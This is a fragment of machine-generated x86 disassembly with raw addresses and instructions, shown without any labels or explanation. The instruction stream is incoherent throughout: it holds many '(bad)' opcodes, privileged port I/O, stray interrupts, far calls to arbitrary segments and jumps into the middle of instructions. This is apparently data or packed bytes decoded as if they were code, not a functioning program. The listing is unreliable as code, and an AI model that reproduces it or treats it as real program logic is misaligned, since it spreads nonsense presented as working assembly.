  40f81e:	and    BYTE PTR [eax],cl
  40f820:	ins    BYTE PTR es:[edi],dx
  40f821:	mov    ebp,0x45722967
  40f826:	pop    eax
  40f827:	inc    eax
  40f828:	fiadd  DWORD PTR [esi+0x225b13f3]
  40f82e:	lods   eax,DWORD PTR ds:[esi]
  40f82f:	scas   al,BYTE PTR es:[edi]
  40f830:	pop    ds
  40f831:	retf   0x8606
  40f834:	mov    al,ds:0x8b33ddf7
  40f839:	pop    esi
  40f83a:	mov    ebp,0xffe0c4dc
  40f83f:	cmp    cl,dl
  40f841:	(bad)  
  40f842:	shl    BYTE PTR [ecx],cl
  40f844:	rcl    BYTE PTR ss:[ebp+0x3dbf6287],0xd
  40f84c:	push   0xfffffff0
  40f84e:	xor    eax,0xa5d494a1
  40f853:	push   ecx
  40f854:	sub    ebp,DWORD PTR [esi+0x4a]
  40f857:	rcr    DWORD PTR [ebp+0x4b68bb6],cl
  40f85d:	adc    ch,cl
  40f85f:	into   
  40f860:	es fs mov ebp,0x7b069d22
  40f867:	sbb    edi,0xb601d1d6
  40f86d:	add    BYTE PTR [ecx-0x46535790],bh
  40f873:	mov    ds:0xb809082b,eax
  40f878:	retf   0xb179
  40f87b:	inc    esi
  40f87c:	push   edx
  40f87d:	push   es
  40f87e:	into   
  40f87f:	stos   BYTE PTR es:[edi],al
  40f880:	pop    edx
  40f881:	pop    ecx
  40f882:	(bad)  
  40f883:	xor    dh,BYTE PTR [esi]
  40f885:	in     eax,dx
  40f886:	jb     0x40f88c
  40f888:	or     eax,0xdc4e0cbd
  40f88d:	outs   dx,BYTE PTR ds:[esi]
  40f88e:	sbb    BYTE PTR [edi-0x53391f7d],ah
  40f894:	push   ebx
  40f895:	ins    DWORD PTR es:[edi],dx
  40f896:	mov    esp,0x30c29d51
  40f89b:	sbb    esp,DWORD PTR [esi-0x25]
  40f89e:	xchg   dh,bh
  40f8a0:	mov    ebp,0xefd02552
  40f8a5:	ja     0x40f894
  40f8a7:	inc    edx
  40f8a8:	or     BYTE PTR ds:0x6fdc569b,dh
  40f8ae:	xchg   ebx,eax
  40f8af:	call   FWORD PTR [eax+0x5c7b7eb2]
  40f8b5:	mov    ds:0x5990588a,eax
  40f8ba:	push   0xffffffd0
  40f8bc:	dec    esi
  40f8bd:	mov    ds,WORD PTR es:[eax]
  40f8c0:	int3   
  40f8c1:	ror    DWORD PTR [eax+0x55],0x39
  40f8c5:	sti    
  40f8c6:	ins    BYTE PTR es:[edi],dx
  40f8c7:	sbb    eax,0x41d7ffee
  40f8cc:	xchg   ebp,eax
  40f8cd:	dec    esp
  40f8cf:	xor    ebx,esi
  40f8d1:	push   0x9267d665
  40f8d6:	js     0x40f89e
  40f8d8:	repnz fistp WORD PTR [edx+0x56072640]
  40f8df:	inc    eax
  40f8e0:	xchg   esp,eax
  40f8e1:	fnstenv [esp+edx*8-0x48f72d02]
  40f8e8:	xor    al,0xa1
  40f8ea:	xchg   ebp,eax
  40f8eb:	xchg   esi,eax
  40f8ec:	lea    esp,[ebx-0x55]
  40f8ef:	out    dx,eax
  40f8f0:	arpl   WORD PTR [eax+0x6ab93a53],dx
  40f8f6:	aam    0xc5
  40f8f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8f9:	mov    ss,WORD PTR [esi]
  40f8fb:	pop    edi
  40f8fc:	adc    ebx,edi
  40f8fe:	or     al,BYTE PTR [edx-0x392fc768]
  40f904:	mov    ebp,0xc4ab2c2a
  40f909:	es mov dl,0x7a
  40f90c:	xchg   ebp,eax
  40f90d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f90e:	test   DWORD PTR [edx-0x1cd9b7a6],0xf86745a3
  40f918:	lds    esp,FWORD PTR [eax-0x4b]
  40f91b:	jo     0x40f89e
  40f91d:	jns    0x40f95e
  40f91f:	rol    BYTE PTR [edx],cl
  40f921:	lahf   
  40f922:	push   eax
  40f923:	cmp    ebx,edi
  40f925:	add    bh,ah
  40f927:	(bad)  
  40f928:	jecxz  0x40f8bb
  40f92a:	jbe    0x40f8f6
  40f92c:	xor    cl,ch
  40f92e:	fst    DWORD PTR [ebp+0x465aced2]
  40f934:	sub    al,BYTE PTR [ebp+0x17]
  40f937:	mov    ecx,0xb77ddd49
  40f93c:	jno    0x40f971
  40f93e:	sub    DWORD PTR [ebx-0x3b581808],0x778f74f5
  40f948:	mov    ebx,0x4cc381a4
  40f94d:	pop    ecx
  40f94e:	inc    ebx
  40f94f:	addr16 hlt 
  40f951:	stos   DWORD PTR es:[edi],eax
  40f952:	rcl    ecx,1
  40f954:	shl    DWORD PTR [ecx-0x40],cl
  40f957:	sub    al,0x7
  40f959:	ret    
  40f95a:	pop    ds
  40f95b:	cwde   
  40f95c:	inc    ecx
  40f95d:	cld    
  40f95e:	mov    edx,0x23eb7b1c
  40f963:	pop    esi
  40f964:	sbb    DWORD PTR [edx-0x1b],edx
  40f967:	sbb    al,0x4b
  40f969:	jno    0x40f9b9
  40f96b:	adc    esi,DWORD PTR [ebx+0x4086ae6]
  40f971:	out    0xa5,al
  40f973:	iret   
  40f974:	loope  0x40f91c
  40f976:	and    cl,BYTE PTR [edx+0x4acc1541]
  40f97c:	mov    esp,0xc68da054
  40f981:	stc    
  40f982:	jl     0x40f923
  40f984:	adc    eax,0xe0570a8e
  40f989:	mov    ds:0x43413727,eax
  40f98e:	mov    al,0x8b
  40f990:	xchg   edi,eax
  40f991:	ja     0x40f9ca
  40f993:	(bad)  
  40f994:	icebp  
  40f995:	adc    BYTE PTR [esi-0x277f5d10],ch
  40f99b:	add    bl,BYTE PTR [ebp-0x610f6c70]
  40f9a1:	inc    ecx
  40f9a2:	(bad)  
  40f9a3:	call   0x65edd2d1
  40f9a8:	mov    esi,0xe64b7e44
  40f9ad:	or     bh,BYTE PTR [ebp-0x4cb08fc0]
  40f9b3:	jp     0x40f98c
  40f9b5:	outs   dx,DWORD PTR ds:[esi]
  40f9b6:	test   esp,ebx
  40f9b8:	mov    bl,0x2b
  40f9ba:	pop    esp
  40f9bb:	pushf  
  40f9bc:	icebp  
  40f9bd:	and    DWORD PTR ds:0x36261fc4,ecx
  40f9c3:	popa   
  40f9c4:	int    0x2
  40f9c6:	pop    edx
  40f9c7:	into   
  40f9c8:	cmc    
  40f9c9:	leave  
  40f9ca:	mov    bl,0xa1
  40f9cc:	lahf   
  40f9cd:	dec    eax
  40f9ce:	gs push eax
  40f9d0:	repz mov bl,dh
  40f9d3:	cmp    ebp,DWORD PTR [eax]
  40f9d5:	cld    
  40f9d6:	push   0xf9fb2c26
  40f9db:	ds push ebp
  40f9dd:	in     eax,dx
  40f9de:	fsubr  DWORD PTR [edx]
  40f9e0:	dec    esi
  40f9e1:	icebp  
  40f9e2:	rcl    DWORD PTR [ebx-0x6fff4cba],0x8f
  40f9e9:	add    cl,BYTE PTR [ecx-0x1ff6a7a]
  40f9ef:	mov    eax,ebp
  40f9f1:	div    DWORD PTR [edx+0x6f18c200]
  40f9f7:	ds mov edi,0x329daff8
  40f9fd:	(bad)  
  40fa01:	out    dx,al
  40fa02:	fild   WORD PTR [ebx+0x5d5f6457]
  40fa08:	int3   
  40fa09:	(bad)  
  40fa0a:	call   0xc29c97ff
  40fa0f:	pop    edi
  40fa10:	test   DWORD PTR ds:0x397f662d,ebx
  40fa16:	cwde   
  40fa17:	mov    esp,0x3ad8aae0
  40fa1d:	push   ss
  40fa1e:	je     0x40f9a0
  40fa20:	jl     0x40fa27
  40fa22:	pop    esp
  40fa23:	fsubrp st(3),st
  40fa25:	push   cs
  40fa26:	sbb    dl,BYTE PTR [ecx+0x9]
  40fa29:	or     esi,DWORD PTR [ebp+0x5b3cfe19]
  40fa2f:	sti    
  40fa30:	clc    
  40fa31:	outs   dx,BYTE PTR ds:[esi]
  40fa32:	icebp  
  40fa33:	mov    ch,0xe9
  40fa35:	pop    esi
  40fa36:	cli    
  40fa37:	iret   
  40fa38:	je     0x40fa75
  40fa3a:	add    al,0xbf
  40fa3c:	sub    DWORD PTR [ecx+0x66],eax
  40fa3f:	mov    BYTE PTR [ecx+0x5a2f100b],dh
  40fa45:	aas    
  40fa46:	mov    ch,0x3a
  40fa48:	xchg   dl,ch
  40fa4a:	push   eax
  40fa4b:	pop    edx
  40fa4c:	call   0x60ed09b2
  40fa51:	shl    edx,1
  40fa53:	jecxz  0x40fa11
  40fa55:	ja     0x40f9d9
  40fa57:	xlat   BYTE PTR ds:[ebx]
  40fa58:	pop    ebp
  40fa59:	daa    
  40fa5a:	dec    edi
  40fa5b:	cmp    eax,0xe73d111c
  40fa60:	in     al,dx
  40fa61:	xchg   esi,eax
  40fa62:	outs   dx,BYTE PTR ds:[esi]
  40fa63:	push   0x13
  40fa65:	lock inc esp
  40fa67:	jb     0x40fa2a
  40fa69:	out    0x93,eax
  40fa6b:	sub    ch,dl
  40fa6d:	mov    ebp,0x11a1b14b
  40fa72:	pushf  
  40fa73:	or     al,0x9e
  40fa75:	in     eax,dx
  40fa76:	mov    ds:0x58e7cb94,eax
  40fa7b:	xchg   edx,eax
  40fa7c:	pop    edx
  40fa7d:	pop    eax
  40fa7e:	gs inc esp
  40fa80:	ret    0xa3fb
  40fa83:	or     eax,0xe588d970
  40fa88:	push   0xb5af64f9
  40fa8d:	les    ebp,FWORD PTR [ecx+0x1b29017c]
  40fa93:	loope  0x40fab3
  40fa95:	stos   BYTE PTR es:[edi],al
  40fa96:	xor    BYTE PTR [esi],al
  40fa98:	dec    ebx
  40fa99:	inc    ecx
  40fa9a:	adc    DWORD PTR [eax+0x2e027b5a],ebp
  40faa0:	mov    ebx,0xccc1a617
  40faa5:	mov    al,0x16
  40faa7:	ins    BYTE PTR es:[edi],dx
  40faa8:	sbb    DWORD PTR [edx+0xcc30903],0x67471ea9
  40fab2:	lock ret 
  40fab4:	arpl   WORD PTR [ebx-0x20f27bc0],sp
  40faba:	fsub   DWORD PTR [esi+edx*4]
  40fabd:	jbe    0x40faba
  40fabf:	jbe    0x40fa9a
  40fac1:	jnp    0x40fb05
  40fac3:	daa    
  40fac4:	jo     0x40fae8
  40fac6:	pop    ecx
  40fac7:	arpl   WORD PTR [ebp+0x20c310c4],dx
  40facd:	repz dec ebx
  40facf:	jmp    0x40fb16
  40fad1:	lds    edi,FWORD PTR [edx]
  40fad3:	inc    ebp
  40fad4:	jp     0x40fb4b
  40fad6:	jno    0x40faf2
  40fad8:	mov    bl,0xe1
  40fada:	mov    ah,0xca
  40fadc:	sub    BYTE PTR [edx+ebp*1],0x4f
  40fae0:	or     BYTE PTR [ebx+0x7c],bl
  40fae3:	lods   al,BYTE PTR ds:[esi]
  40fae4:	daa    
  40fae5:	cwde   
  40fae6:	jecxz  0x40fb34
  40fae8:	mov    ecx,gs
  40faea:	mov    bh,0xf0
  40faec:	call   0xd109f6b2
  40faf1:	test   al,0xf0
  40faf3:	jle    0x40fb2b
  40faf5:	call   0xcff3988
  40fafa:	xor    DWORD PTR [eax+0x45034ad2],esp
  40fb00:	jb     0x40fac0
  40fb02:	sub    al,0x11
  40fb04:	mov    BYTE PTR [ebx],bl
  40fb06:	shl    DWORD PTR [edi],0xab
  40fb09:	(bad)  
  40fb0a:	or     eax,0xa01c9504
  40fb0f:	cmp    ah,dh
  40fb11:	mov    cl,0x41
  40fb13:	push   0xffffffe5
  40fb15:	mov    dl,BYTE PTR [eax-0x15f57f01]
  40fb1b:	xor    al,0x4c
  40fb1d:	jns    0x40fb1e
  40fb1f:	imul   BYTE PTR [ebp+ecx*8+0x7]
  40fb23:	mov    eax,0xb131d16c
  40fb28:	fsub   QWORD PTR [edi+0x29b9407f]
  40fb2e:	or     BYTE PTR [eax+eax*8],bl
  40fb31:	sbb    DWORD PTR [ecx+esi*1],eax
  40fb34:	mov    ds:0xb1e21db,eax
  40fb39:	push   cs
  40fb3a:	pop    ecx
  40fb3b:	mov    dh,0x25
  40fb3d:	je     0x40fb02
  40fb3f:	mov    eax,ds:0x47751bec
  40fb44:	addr16 mov ebx,0x37f19ceb
  40fb4a:	shl    DWORD PTR [esi+0x70],1
  40fb4d:	sub    edi,esp
  40fb4f:	pop    edi
  40fb50:	sbb    dl,BYTE PTR [edx]
  40fb52:	popa   
  40fb53:	in     al,dx
  40fb54:	pop    esi
  40fb55:	cmc    
  40fb56:	jmp    0x40fb3c
  40fb58:	or     DWORD PTR [esi],0x3334f5ed
  40fb5e:	and    eax,0x635f0b05
  40fb63:	inc    esi
  40fb64:	aaa    
  40fb65:	add    ebp,ecx
  40fb67:	adc    BYTE PTR [ebx+0x10],ch
  40fb6a:	inc    eax
  40fb6b:	xor    edx,DWORD PTR [edx+eiz*4-0x5252e747]
  40fb72:	jbe    0x40fb9e
  40fb74:	pop    ecx
  40fb75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb76:	test   BYTE PTR [ecx-0x55d411ed],bl
  40fb7c:	fadd   DWORD PTR [esi]
  40fb7e:	shl    ah,1
  40fb80:	mov    al,ds:0x5c869452
  40fb85:	(bad)  
  40fb86:	xchg   esp,eax
  40fb87:	pop    eax
  40fb88:	dec    eax
  40fb89:	inc    ebx
  40fb8a:	cli    
  40fb8b:	pop    ecx
  40fb8c:	aam    0x6f
  40fb8e:	sti    
  40fb8f:	adc    DWORD PTR [eax],ecx
  40fb91:	retf   
  40fb92:	jo     0x40fbab
  40fb94:	fld    TBYTE PTR [ecx-0x28832b43]
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e224
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x55
  40fbb3:	rcr    BYTE PTR [edi],0x4
  40fbb6:	xor    BYTE PTR [ecx+0x7da37070],0x70
  40fbbd:	jo     0x40fc2f
  40fbbf:	rcr    BYTE PTR [edx+0x470edf87],cl
  40fbc5:	xor    BYTE PTR ds:0x346cf892,bh
  40fbcb:	sub    BYTE PTR [edi],0x73
  40fbce:	mov    BYTE PTR [eax+ecx*1],bl
  40fbd1:	pop    eax
  40fbd2:	jecxz  0x40fb90
  40fbd4:	push   0x11
  40fbd6:	data16 aad 0x73
  40fbd9:	and    DWORD PTR [ebx-0x39],esp
  40fbdc:	cli    
  40fbdd:	and    DWORD PTR [ecx+0x72],ecx
  40fbe0:	mov    al,ds:0x7771d99a
  40fbe5:	arpl   WORD PTR [ecx-0x5d69f1bc],cx
  40fbeb:	int    0xf0
  40fbed:	dec    ebp
  40fbee:	ror    BYTE PTR ds:0xa7b016da,0xcc
  40fbf5:	fcmovu st,st(7)
  40fbf7:	sub    ah,cl
  40fbf9:	fisub  WORD PTR [edi+0x3f216f35]
  40fbff:	xchg   ebx,eax
  40fc00:	pop    edi
  40fc01:	dec    edx
  40fc02:	sub    BYTE PTR [edx+0x34],bl
  40fc05:	sahf   
  40fc06:	mov    cl,0x98
  40fc08:	pop    eax
  40fc09:	xchg   edi,eax
  40fc0a:	ins    DWORD PTR es:[edi],dx
  40fc0b:	jmp    0x40fc3e
  40fc0d:	dec    edi
  40fc0e:	push   DWORD PTR [edi+esi*1-0x7a6ba395]
  40fc15:	mov    edx,DWORD PTR [eax]
  40fc17:	mov    cl,0xbd
  40fc19:	jl     0x40fbad
  40fc1b:	jecxz  0x40fc73
  40fc1d:	sbb    esi,DWORD PTR [ebp+edi*8-0x29]
  40fc21:	retf   
  40fc22:	out    0xdd,eax
  40fc24:	arpl   WORD PTR [esi+eax*4],si
  40fc27:	inc    ebx
  40fc28:	jge    0x40fc84
  40fc2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc2b:	addr16 jae 0x40fbb3
  40fc2e:	or     esi,DWORD PTR [esp+ecx*2]
  40fc31:	jecxz  0x40fbc4
  40fc33:	aam    0x44
  40fc35:	push   ecx
  40fc36:	outs   dx,BYTE PTR ds:[esi]
  40fc37:	hlt    
  40fc38:	aas    
  40fc39:	mov    ds,WORD PTR [edx+esi*8]
  40fc3c:	fucom  st(5)
  40fc3e:	jne    0x40fc0f
  40fc40:	pop    esi
  40fc41:	leave  
  40fc42:	bound  eax,QWORD PTR [ebx+0x3c]
  40fc45:	mov    ah,0xb8
  40fc47:	sbb    eax,0x2efd9747
  40fc4c:	stc    
  40fc4d:	push   esp
  40fc4e:	adc    cl,al
  40fc50:	loopne 0x40fc67
  40fc52:	in     eax,dx
  40fc53:	xchg   ecx,eax
  40fc54:	jns    0x40fc44
  40fc56:	into   
  40fc57:	mov    al,ds:0x8367ee26
  40fc5c:	enterw 0xd0b9,0xc2
  40fc61:	aaa    
  40fc62:	cli    
  40fc63:	sbb    ebp,esi
  40fc65:	jns    0x40fbee
  40fc67:	adc    ebp,DWORD PTR [edx]
  40fc69:	jo     0x40fca3
  40fc6b:	and    BYTE PTR [ebx],bl
  40fc6d:	ss pop ebx
  40fc6f:	test   DWORD PTR [ebx],ecx
  40fc71:	mov    ebx,0x98bd2989
  40fc76:	jge    0x40fc46
  40fc78:	sub    BYTE PTR [edx-0x161b6242],dh
  40fc7e:	xchg   edx,eax
  40fc7f:	jp     0x40fc36
  40fc81:	cmp    eax,0xc1b4a467
  40fc86:	clc    
  40fc87:	or     DWORD PTR [ecx-0x6],edx
  40fc8a:	xchg   edx,eax
  40fc8b:	inc    ecx
  40fc8c:	adc    eax,0xbb327db9
  40fc91:	outs   dx,BYTE PTR ds:[esi]
  40fc92:	daa    
  40fc93:	adc    BYTE PTR [edi+ecx*4+0x1cc1cc2a],ch
  40fc9a:	lods   eax,DWORD PTR ds:[esi]
  40fc9b:	pop    esi
  40fc9c:	mov    ecx,0x9717d28c
  40fca1:	sbb    cl,BYTE PTR [esi+0x2]
  40fca4:	test   al,0xd5
  40fca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fca7:	fsubr  DWORD PTR [edi+eax*2+0x545b7535]
  40fcae:	scas   al,BYTE PTR es:[edi]
  40fcaf:	rol    BYTE PTR [edx+0x4a630654],cl
  40fcb5:	(bad)  
  40fcb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcb7:	pop    esi
  40fcb8:	retf   0xcaee
  40fcbb:	inc    esp
  40fcbc:	repz mov ds:0x9d54620c,eax
  40fcc2:	jns    0x40fcfe
  40fcc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcc5:	mov    cl,0xc0
  40fcc7:	cmp    eax,0x4ed03022
  40fccc:	test   al,0xf2
  40fcce:	imul   esi,DWORD PTR [esi],0x7b
  40fcd1:	nop
  40fcd2:	sbb    eax,0x5f5ba8c6
  40fcd7:	and    eax,DWORD PTR [edx+0x58]
  40fcda:	xlat   BYTE PTR ds:[ebx]
  40fcdb:	mov    edx,0xefc42a7e
  40fce0:	push   ebp
  40fce1:	mov    al,0x15
  40fce3:	addr16 addr16 sbb al,0x16
  40fce7:	push   0xffffffcc
  40fce9:	call   0x6db2877
  40fcee:	xchg   ecx,eax
  40fcef:	jecxz  0x40fd66
  40fcf1:	pop    esp
  40fcf2:	(bad)  
  40fcf3:	mov    eax,0x8b6fde8e
  40fcf8:	sub    edx,DWORD PTR [ebx-0x5c03048a]
  40fcfe:	call   0x685f1a5
  40fd03:	push   edi
  40fd04:	and    dl,al
  40fd06:	add    DWORD PTR [ecx+0x37],esp
  40fd09:	xor    esp,DWORD PTR [eax-0x37]
  40fd0c:	jae    0x40fc92
  40fd0e:	ret    0x4416
  40fd11:	mov    ch,0x52
  40fd13:	out    0x5e,al
  40fd15:	(bad)  
  40fd16:	xlat   BYTE PTR ds:[ebx]
  40fd17:	retf   
  40fd18:	xchg   esi,eax
  40fd19:	test   al,0xf0
  40fd1b:	fdivr  QWORD PTR [esp+esi*4]
  40fd1e:	xor    al,0x68
  40fd20:	mov    WORD PTR [edi-0x29d8e40d],?
  40fd26:	or     eax,ebp
  40fd28:	fstp   QWORD PTR [esp+eiz*4+0x3416c85c]
  40fd2f:	cs sub al,0x10
  40fd32:	xchg   edi,eax
  40fd33:	push   ss
  40fd34:	in     eax,0x5f
  40fd36:	pop    ds
  40fd37:	cmp    DWORD PTR [ecx+0x78],ecx
  40fd3a:	cmp    cl,BYTE PTR [ebp+edx*2-0x55]
  40fd3e:	gs out dx,al
  40fd40:	push   esi
  40fd41:	ret    0x921d
  40fd44:	pop    edi
  40fd45:	outs   dx,DWORD PTR ds:[esi]
  40fd46:	leave  
  40fd47:	mov    bl,0xec
  40fd49:	call   0x29b5:0xb0ba5540
  40fd50:	mov    cl,dh
  40fd52:	and    BYTE PTR [esp+ebx*8-0x1],0x98
  40fd57:	mov    esp,0xffb9f9d9
  40fd5c:	sar    cl,0x91
  40fd5f:	sub    dl,BYTE PTR [edx+0x27e9d3c9]
  40fd65:	xchg   ax,ax
  40fd67:	cmp    ah,dl
  40fd69:	pushf  
  40fd6a:	adc    BYTE PTR [edx+0x22a24a1f],0x2
  40fd71:	retf   
  40fd72:	push   esi
  40fd73:	aam    0xc4
  40fd75:	mov    cl,BYTE PTR [edx+0x234a5e84]
  40fd7b:	shr    DWORD PTR [edx-0x39],cl
  40fd7e:	daa    
  40fd7f:	adc    edx,DWORD PTR [edi]
  40fd81:	ins    BYTE PTR es:[edi],dx
  40fd82:	js     0x40fdf9
  40fd84:	scas   eax,DWORD PTR es:[edi]
  40fd85:	xor    BYTE PTR [ecx],dl
  40fd87:	push   ebp
  40fd88:	dec    esp
  40fd89:	dec    edx
  40fd8a:	ins    BYTE PTR es:[edi],dx
  40fd8b:	gs and al,0xc
  40fd8e:	inc    esp
  40fd8f:	mov    ds:0xa1f70fde,al
  40fd94:	into   
  40fd95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd96:	mov    ch,0x9b
  40fd98:	(bad)  
  40fd99:	out    0xbd,eax
  40fd9b:	test   al,0xef
  40fd9d:	xor    ch,BYTE PTR [eax]
  40fd9f:	cmp    eax,0x5ecd1f59
  40fda4:	pop    es
  40fda5:	stos   BYTE PTR es:[edi],al
  40fda6:	(bad)  [ebp+eiz*4-0x67dc56d1]
  40fdad:	shr    DWORD PTR [ebx-0x6c26d5e6],0xa2
  40fdb4:	mov    al,ds:0x5741b6f
  40fdb9:	aas    
  40fdba:	je     0x40fd64
  40fdbc:	mov    bl,bl
  40fdbe:	pushf  
  40fdbf:	cwde   
  40fdc0:	pop    edi
  40fdc1:	add    eax,0x7df47767
  40fdc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdc7:	addr16 jae 0x40fe01
  40fdca:	mov    bh,0xfe
  40fdcc:	add    al,0xd7
  40fdce:	call   0xa8d828bd
  40fdd3:	pop    ss
  40fdd4:	push   eax
  40fdd5:	addr16 mov edx,0xd2f9a46a
  40fddb:	adc    eax,0x7f839600
  40fde0:	data16 sub al,0xb6
  40fde3:	sbb    eax,0x5658e4e4
  40fde8:	mov    ds:0xaab0ac57,eax
  40fded:	(bad)  
  40fdee:	and    dl,dl
  40fdf0:	add    DWORD PTR [ebp-0x48cfcd4a],esi
  40fdf6:	scas   al,BYTE PTR es:[edi]
  40fdf7:	push   ds
  40fdf8:	outs   dx,DWORD PTR ds:[esi]
  40fdf9:	jge    0x40fdc9
  40fdfb:	scas   al,BYTE PTR es:[edi]
  40fdfc:	mov    esi,0xea4cc0b0
  40fe01:	inc    eax
  40fe02:	xor    esi,edi
  40fe04:	cdq    
  40fe05:	enter  0xebb8,0xb1
  40fe09:	dec    ebx
  40fe0a:	dec    edx
  40fe0b:	jg     0x40fd96
  40fe0d:	sub    DWORD PTR [ebx+0x4ad74ea5],edx
  40fe13:	loop   0x40fe3e
  40fe15:	lods   al,BYTE PTR ds:[esi]
  40fe16:	loope  0x40fe20
  40fe18:	push   0x10
  40fe1a:	loop   0x40fdb7
  40fe1c:	sbb    eax,0x319a2415
  40fe21:	jo     0x40fea0
  40fe23:	cmc    
  40fe24:	clc    
  40fe25:	call   DWORD PTR [ebx]
  40fe27:	or     dh,BYTE PTR [edi-0x23e0f92c]
  40fe2d:	pop    esp
  40fe2e:	fdiv   st,st(0)
  40fe30:	xlat   BYTE PTR ds:[ebx]
  40fe31:	leave  
  40fe32:	outs   dx,DWORD PTR ds:[esi]
  40fe33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe34:	push   cs
  40fe35:	mov    esi,0x64403207
  40fe3a:	sti    
  40fe3b:	out    0x12,al
  40fe3d:	xor    BYTE PTR [eax],al
  40fe3f:	sbb    al,BYTE PTR [esp+edx*4]
  40fe42:	push   0x4ff1b5b7
  40fe47:	pop    ss
  40fe48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe49:	ds cld 
  40fe4b:	xrelease mov BYTE PTR [esi],ch
  40fe4e:	xchg   edi,eax
  40fe4f:	enter  0x74f5,0xa9
  40fe53:	lods   eax,DWORD PTR ds:[esi]
  40fe54:	and    dl,dh
  40fe56:	mov    eax,0x91abc1c2
  40fe5b:	xchg   ebx,eax
  40fe5c:	dec    eax
  40fe5d:	out    0x81,al
  40fe5f:	or     ebp,DWORD PTR [ecx-0x77]
  40fe62:	jns    0x40fecc
  40fe64:	dec    edx
  40fe65:	mov    edi,ecx
  40fe67:	cmp    ebx,esi
  40fe69:	arpl   WORD PTR [esi+0x64],bx
  40fe6c:	mov    ah,0x40
  40fe6e:	jmp    0x40fe50
  40fe70:	shl    DWORD PTR [ebx+0x41e81d99],1
  40fe76:	mov    WORD PTR ds:0xcb6406ec,gs
  40fe7c:	pop    esp
  40fe7e:	cdq    
  40fe7f:	in     al,0x33
  40fe81:	mov    cl,0xec
  40fe83:	dec    ecx
  40fe84:	push   0x46
  40fe86:	mov    cl,BYTE PTR [eax-0x33]
  40fe89:	sub    dh,BYTE PTR [ebx]
  40fe8b:	sbb    ch,BYTE PTR [ecx]
  40fe8d:	lods   eax,DWORD PTR ds:[esi]
  40fe8e:	and    dl,ch
  40fe90:	jb     0x40fe51
  40fe92:	shl    DWORD PTR [eax-0x44a2a33a],0xaa
  40fe99:	xor    al,0xeb
  40fe9b:	popa   
  40fe9c:	push   0x36eb23ef
  40fea1:	fisub  DWORD PTR [ecx-0x62]
  40fea4:	and    al,0xb4
  40fea6:	adc    eax,0xde89cf92
  40feab:	xor    edi,DWORD PTR [eax-0x21]
  40feae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feaf:	push   0x36
  40feb1:	jge    0x40fe8d
  40feb3:	cmp    al,bh
  40feb5:	enter  0x999,0x45
  40feb9:	fsubr  DWORD PTR [eax-0x5b]
  40febc:	mov    ah,0x5e
  40febe:	sti    
  40febf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fec0:	popf   
  40fec1:	or     BYTE PTR [edi-0x770bd],ah
  40fec7:	mov    bh,0x51
  40fec9:	dec    esp
  40feca:	jmp    0x78201ec0
  40fecf:	mov    ds:0x7b032e44,al
  40fed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fed5:	je     0x40fef3
  40fed7:	sbb    al,0xaa
  40fed9:	leave  
  40feda:	add    DWORD PTR [esi+0x2],0x4e320426
  40fee1:	and    esi,DWORD PTR [ecx-0x40]
  40fee4:	push   ebx
  40fee5:	jle    0x40ff3b
  40fee7:	ret    
  40fee8:	das    
  40fee9:	ret    
  40feea:	lahf   
  40feeb:	in     al,0x99
  40feed:	xchg   ecx,eax
  40feee:	dec    ebp
  40feef:	call   DWORD PTR [ebx-0x8]
  40fef2:	mul    dh
  40fef4:	pop    esi
  40fef5:	pop    esp
  40fef6:	push   es
  40fef7:	or     eax,ebx
  40fef9:	xchg   esi,eax
  40fefa:	fdivr  QWORD PTR [esi]
  40fefc:	sbb    edi,DWORD PTR [ecx]
  40fefe:	aad    0x14
  40ff00:	and    DWORD PTR [ebp-0x38],ebp
  40ff03:	lods   al,BYTE PTR ds:[esi]
  40ff04:	in     eax,dx
  40ff05:	mov    WORD PTR [edx+0x71ddab7a],gs
  40ff0b:	fld    TBYTE PTR [ebx+0x2a32d8c]
  40ff11:	inc    esp
  40ff12:	dec    esi
  40ff13:	jb     0x40ff3a
  40ff15:	adc    eax,0x12827ef8
  40ff1a:	or     al,0xb8
  40ff1c:	pop    ds
  40ff1d:	mov    eax,ds:0xf56f234d
  40ff22:	call   0x6ece3dcf
  40ff27:	mov    edi,0x8759f9c7
  40ff2c:	push   ebx
  40ff2d:	dec    esp
  40ff2e:	sub    bl,BYTE PTR [ebx-0x7]
  40ff31:	mov    esi,0xb534f49c
  40ff36:	dec    esp
  40ff37:	call   0x3baa:0x455e3c67
  40ff3e:	sbb    DWORD PTR [edx-0x36],ecx
  40ff41:	push   ds
  40ff42:	ret    0x8615
  40ff45:	fsubr  QWORD PTR [esp+eax*4-0x3f]
  40ff49:	imul   ebx,DWORD PTR [ecx+0x72550a71],0x8e6fb073
  40ff53:	aas    
  40ff54:	jnp    0x40ff56
  40ff56:	sub    ah,0x68
  40ff59:	or     ebp,DWORD PTR [ebx-0x5eb2d5ec]
  40ff5f:	dec    eax
  40ff60:	push   0x6e2c9202
  40ff65:	mov    ecx,0xe24f8758
  40ff6a:	add    edi,eax
  40ff6c:	inc    ebp
  40ff6d:	cld    
  40ff6e:	xor    DWORD PTR [ebp+0x458bf89c],eax
  40ff74:	or     BYTE PTR [edx+0x3405c700],cl
  40ff7a:	loop   0x40ffbe
  40ff7c:	add    BYTE PTR [edx],bh
  40ff7e:	cmp    al,BYTE PTR [eax]
  40ff80:	add    BYTE PTR [edi+esi*1],al
  40ff83:	xor    DWORD PTR ds:0x42e7f7,0x42fe7e
  40ff8d:	xor    al,0x47
